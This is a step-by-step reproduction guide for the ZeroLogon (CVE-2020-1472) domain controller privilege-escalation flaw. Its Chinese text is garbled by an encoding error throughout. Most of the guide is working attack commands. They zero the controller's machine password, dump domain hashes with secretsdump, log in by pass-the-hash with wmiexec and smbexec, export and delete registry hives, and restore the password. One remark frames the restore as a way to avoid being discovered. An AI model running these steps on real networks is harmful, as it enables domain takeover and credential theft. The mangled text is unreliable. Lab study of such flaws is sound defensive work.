# CVE-2020-1472 ZeroLogonç‰¹æƒæå‡æ¼æ´

<font color=green>**æ³¨æ„äº‹é¡¹ï¼šè¯¥è¿‡ç¨‹å¯èƒ½ä¼šå¯¹åŸŸç¯å¢ƒé€ æˆå½±å“ï¼Œè¯·å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒå¤ç°**</font>

### ä¸€ã€æ¼æ´ç®€ä»‹ï¼š

> NetLogon è¿œç¨‹åè®®æ˜¯ä¸€ç§åœ¨ Windows åŸŸæ§ä¸Šä½¿ç”¨çš„ RPC æ¥å£,è¢«ç”¨äºå„ç§ä¸ç”¨æˆ·å’Œæœºå™¨è®¤è¯ç›¸å…³çš„ä»»åŠ¡ã€‚æœ€å¸¸ç”¨äºè®©ç”¨æˆ·ä½¿ç”¨ NTLM åè®®ç™»å½•æœåŠ¡å™¨ï¼Œä¹Ÿç”¨äº NTP å“åº”è®¤è¯ä»¥åŠæ›´æ–°è®¡ç®—æœºåŸŸå¯†ç å¾®è½¯MSRCäº8æœˆ11æ—¥ å‘å¸ƒäº†Netlogon ç‰¹æƒæå‡æ¼æ´å®‰å…¨é€šå‘Šã€‚æ­¤æ¼æ´CVEç¼–å·CVE-2020-1472ï¼Œ CVSS è¯„åˆ†:10.0ã€‚ç”± Secura å…¬å¸çš„ Tom Tervoort å‘ç°æäº¤å¹¶å‘½åä¸º **ZeroLogon**ï¼›
> æ”»å‡»è€…ä½¿ç”¨ Netlogon è¿œç¨‹åè®® (MS-NRPC) å»ºç«‹ä¸åŸŸæ§åˆ¶å™¨è¿æ¥çš„ Netlogon å®‰å…¨é€šé“æ—¶ï¼Œå­˜åœ¨ç‰¹æƒæå‡æ¼æ´ã€‚å½“æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯æ— éœ€é€šè¿‡èº«ä»½éªŒè¯ï¼Œåœ¨ç½‘ç»œä¸­çš„è®¾å¤‡ä¸Šè¿è¡Œç»ç‰¹æ®Šè®¾è®¡çš„åº”ç”¨ç¨‹åºï¼Œè·å–åŸŸæ§åˆ¶å™¨çš„ç®¡ç†å‘˜æƒé™ã€‚

### äºŒã€å½±å“èŒƒå›´ï¼š

> Windows Server 2012 (Server Core installation)
> 
> Windows Server 2012 R2
> 
> Windows Server 2012 R2 (Server Core installation)
> 
> Windows Server 2016
> 
> Windows Server 2016 (Server Core installation)
> 
> Windows Server 2019
> 
> Windows Server 2019 (Server Core installation)
> 
> Windows Server, version 1903 (Server Core installation)
> 
> Windows Server, version 1909 (Server Core installation)

### ä¸‰ã€éœ€è¦çš„ç¯å¢ƒï¼š

> 1ã€æ­å»ºä¸€ä¸ªç®€å•çš„åŸŸç¯å¢ƒï¼Œæ­¤å¤„ä½¿ç”¨Windows Server 2012 R2ï¼›ä¸ä¼šçš„å¯å‚è€ƒ
> 
> https://blog.csdn.net/wwl012345/article/details/88934571
> 
> 2ã€Pythonç¯å¢ƒ æœ€å¥½æ˜¯python3
> 
> 3ã€å®‰è£…Impacketå·¥å…·åŒ…ï¼›å¯å‚è€ƒhttps://www.freebuf.com/sectool/175208.html
> 
> 4ã€EXP&POC
> 
> https://github.com/dirkjanm/CVE-2020-1472.git (EXP)
> 
> https://github.com/SecuraBV/CVE-2020-1472.git (POC)

### å››ã€å¤ç°è¿‡ç¨‹ï¼š

> æ­å»ºåŸŸç¯å¢ƒ->å®‰è£…impacketå·¥å…·åŒ…->ä¸‹è½½POCåŠEXP->åˆ©ç”¨POCæ£€æµ‹æ˜¯å¦å¯åˆ©ç”¨->åˆ©ç”¨EXPç½®ç©ºåŸŸæ§å¯†ç ->è·å¾—ç”¨æˆ·hash->é€šè¿‡hashå–å¾—ä¸€ä¸ªshell->è·å¾—æœºå™¨ä¿å­˜çš„åŸhash->é€šè¿‡è·å¾—çš„hashæ¢å¤ç½®ç©ºåŸŸæ§å¯†ç 

---

#### 1.1ã€Kaliå®‰è£…pip3:

```bash
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python3 get-pip.py
```

#### 1.2ã€ä¸‹è½½å®‰è£…Impacketå·¥å…·åŒ…ï¼š

```bash
git clone https://github.com/SecureAuthCorp/impacket.gitcd /impacket
python3 setup.py install
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgFKfx7Irp7dHNWpEsmGYtzia0kZUVaQ0dvMqOKRK3POs1vwx0j9b5aZw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.3ã€ä¸‹è½½POC&EXPï¼š

```bash
git clone https://github.com/SecuraBV/CVE-2020-1472.git  CVE-2020-1472_POC
git clone https://github.com/dirkjanm/CVE-2020-1472.git  CVE-2020-1472_EXP
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgM7nILWrqa23ThGiaPvD0Qd5XUMtRmvdSSthL9yHOiaTov0HzCtS7N4NQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgJb9wv22XXbcxcaMZI0hSKmJg4BDicZQjkjH3SJEBbUNgHBabggq2vtw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.4ã€åˆ©ç”¨POCæ£€æµ‹ï¼š

```bash
cd /root/github/CVE-2020-1472_POC
python3 zerologon_tester.py WIN-C6LETGR17RK 192.168.5.132
```

![å›¾ç‰‡](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143639.png)

![å›¾ç‰‡](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143640.png)

#### <font color=red>1.5ã€åˆ©ç”¨EXPè·å–åŸŸæ§å­˜å‚¨çš„hashï¼š</font>

```
1.å°†åŸŸæ§å¯†ç ç½®ä¸ºç©ºå¯†ç ï¼š
cd /root/github/CVE-2020-1472_EXP
python3 cve-2020-1472-exploit.py WIN-C6LETGR17RK(è¿™æ˜¯åŸŸæ§ä¸»æœºå) 192.168.5.132(è¿™æ˜¯åŸŸæ§ip)
2.è·å¾—åŸŸæ§ä¸Šçš„hashï¼š
cd /root/github/impacket/examples
python3 secretsdump.py tbosec.com/WIN-C6LETGR17RK\$@192.168.5.132 -no-pass
ä¸Šé¢æ˜¯ åŸŸå/åŸŸæ§ä¸»æœºå\$@åŸŸæ§ip
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgoIRVC0Fy0p1wqmDUABnkoBaiacz07Nb5P476fBv6eLIJUJAwjrshXYg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhg1jnXp856QZA58R8aFIyhbzpcic4NLgwoJgm1Rv6IwWGaYMxQZQbibKyg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.6ã€ä½¿ç”¨hashç™»å½•åŸŸæ§ï¼š

```
cd /root/github/impacket/examples
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36a06e6257a0e2c2b0bb3673f6297df7 administrator@192.168.5.132
æˆ–è€…ï¼›å»ºè®®ä½¿ç”¨ğŸ‘‡
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36a06e6257a0e2c2b0bb3673f6297df7 tbosec.com/administrator@192.168.5.132
```

![å›¾ç‰‡](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143641)

#### 1.7ã€æ¢å¤åŸŸæ§å¯†ç ï¼š

**åé¢è¿™å‡ æ­¥éå¿…é¡»ï¼Œä½†çœŸå®åœºæ™¯ä¸­é¿å…å½±å“æ­£å¸¸ä¸šåŠ¡æˆ–è¢«å‘ç°å¯ä»¥æ¢å¤åŸŸæ§å¯†ç **

```
å‚è€ƒæ–¹æ³•ï¼š
https://github.com/risksense/zerologon
1.å¯¼å‡ºsamç­‰æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œè·å¾—åŸŸæ§ä¸Šè¾¹æœ¬åœ°ä¿å­˜çš„ç½®ç©ºå‰çš„hash
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.save
get security.save
del /f system.save
del /f sam.save
del /f security.save
```

![å›¾ç‰‡](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143641.png)

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhg0hicLeRqse3MiazibrMy6qt70ZiaNDbzlmibFatEUatHl5pFcP2f8nZKMYQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.8ã€é€šè¿‡samç­‰æ–‡ä»¶è·å¾—åŸntlm hashï¼š

```
cd /root/github/impacket/examples
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgszo0lLa0EZXmmIHYw2mnJIhlSpwFmofViaicy85A4DcPHjpqXstgo04w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 1.9ã€æ¢å¤åŸhashï¼š

```
git clone https://github.com/risksense/zerologon.git
cd zerologon
python3 reinstall_original_pw.py WIN-7JMG7PQ1LL8(åŸŸæ§ä¸»æœºå) 192.168.5.132 f9bca1e49fbfb7fec5fc54d80c72a79c(è¿™æ˜¯ä¸Šé¢çº¢æ¡†çš„ååŠéƒ¨åˆ†)
```

![å›¾ç‰‡](https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxenprmay3gyKzOSp3D7lXhgSrYibZGYe5PWwgF6CibzFsibeUYIY9g43icpPzqp2ibwpGVn9KA8DXOwySw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#### 2.0ã€ç¡®è®¤æ˜¯å¦æ¢å¤æˆåŠŸï¼š

**å†æ¬¡å°è¯•è·å–hashå·²ç»ä¸èƒ½æˆåŠŸäº†ï¼ŒæˆåŠŸæ¢å¤**

![å›¾ç‰‡](https://cdn.jsdelivr.net/gh/mask75/imgs@master/20210704143642.png)

#### æœ€åï¼š

------

å¦‚æœè¿‡ç¨‹å‡ºç°éƒ¨åˆ†é”™è¯¯ï¼Œå¯å‚è€ƒä¸‹é¢çš„å¸–å­ï¼Œå‰äººå·²æ•´ç†å‡ºæ¥

http://0x3.biz/archives/1960.html
